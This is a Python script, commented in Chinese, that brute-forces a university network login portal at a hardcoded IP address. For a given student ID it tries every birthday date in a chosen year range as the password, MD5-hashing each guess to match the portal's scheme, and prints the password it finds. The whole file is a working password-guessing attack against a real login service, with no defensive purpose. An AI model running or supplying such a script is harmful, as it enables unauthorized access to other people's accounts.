################################################################################
#待解决问题，当密码错误时程序能够正常运行，但当用户名错误（位数不对时），程序会挂起。
import urllib.request
import hashlib
import urllib.parse

Month_Day=[31,29,31,30,31,30,31,31,30,31,30,31]

def get_password(old_pass):
    mpass=hashlib.md5()
    mpass.update(old_pass.encode("utf-8"))
    new_pass=mpass.hexdigest()
    new_pass=new_pass[8:24]
    return new_pass

def check_password(username,password):
    new_pass=get_password(password)
    formdata={
        'username':username,
        'password':new_pass,
        'drop':0,
        'type':1,
        'n':100}
    url="http://202.112.136.131/cgi-bin/do_login"
    user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36'
    headers={'User-Agent':user_agent,
             'Content-Length':64,
             'Connection':'keep-alive',
             'Content-Type':"application/x-www-form-urlencoded"}
    formdata=urllib.parse.urlencode(formdata)
    formdata=formdata.encode("gbk")
    #print("123")
    req=urllib.request.Request(url,headers=headers,data=formdata)
    #print("123")
    myResponse=urllib.request.urlopen(req)
    #print("123")
    backcode=myResponse.read()
    #print(backcode)
    backcode=backcode.decode("gbk")
    if backcode!='password_error':
        return True
    return False
    # print(backcode)

def getBirthday(year,mon,day):
    birthday=str(year)
    Mon=str(mon+1)
    if(len(Mon)<2):
        Mon='0'+Mon
    Day=str(day+1)
    if(len(Day)<2):
        Day='0'+Day
    birthday=birthday+Mon+Day
    return birthday

def getPassword(username,textpass):
    result=False
    if '-' in testpass:
        begyear=testpass.split('-')[0]
        endyear=testpass.split('-')[1]
        for i in range(int(begyear),int(endyear)+1):
            for j in range(12):
                for k in range(Month_Day[j]):
                    password=getBirthday(i,j,k)
                    print(password)
                    result=check_password(username,password)
                    if result==True:
                        print("登录成功！")
                        return password
    else:
        password=str(testpass)
        result=check_password(username,password)
        if result==True:
            print("登录成功！")
            return password
    return "wrong password"

username=input("请输入学号(字母小写):")
testpass=input("请输入密码(若未知请输入年份区间 e.g. 1988-1989):")

password=getPassword(username,testpass)
print("用户名:",end=' ')
print(username)
print("密码:",end='  ')
print(password)
